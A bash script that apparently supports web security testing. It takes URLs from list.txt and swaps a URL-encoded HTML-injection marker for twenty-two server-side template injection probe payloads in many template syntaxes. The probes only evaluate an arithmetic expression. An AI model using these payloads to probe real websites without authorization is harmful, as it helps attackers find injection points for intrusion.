#!/bin/bash

# Check if list.txt exists
if [ ! -f "list.txt" ]; then
  echo "Error: 'list.txt' not found."
  exit 1
fi

# Define the payloads
payloads=("{9000*695959156}" "*{9000*695959156}" "{{9000*695959156}}" "\${9000*695959156}" "@(9000*695959156)" "<?=9000*695959156?>" "<%= 9000*695959156 %>" "\${= 9000*695959156}" "{{= 9000*695959156}}" "\$\{{9000*695959156}}" "#{9000*695959156}" "[% 9000*695959156 %]" "<% 9000*695959156 %>" "[%= 9000*695959156 %]" "<% 9000*695959156 %>" "{{% 9000*695959156 %}}" "{{<% 9000*695959156 %>}}" "[[ 9000*695959156 ]]" "{{# 9000*695959156 }}" "<# 9000*695959156 #>" "[- 9000*695959156 -]" "[=9000*695959156]")

# Loop through each line in list.txt
while IFS= read -r line; do
  # Check if the line contains the specific word
  if [[ "$line" == *"%27%22%2500%3E%3Ch1%3Eakira%3C%2Fh1%3E"* ]]; then
    # Loop through the payloads and replace the specific word with each payload
    for payload in "${payloads[@]}"; do
      modified_line="${line//%27%22%2500%3E%3Ch1%3Eakira%3C%2Fh1%3E/$payload}"
      echo "$modified_line"
    done
  else
    # If the line does not contain the specific word, print it as is
    echo "$line"
  fi
done < "list.txt"
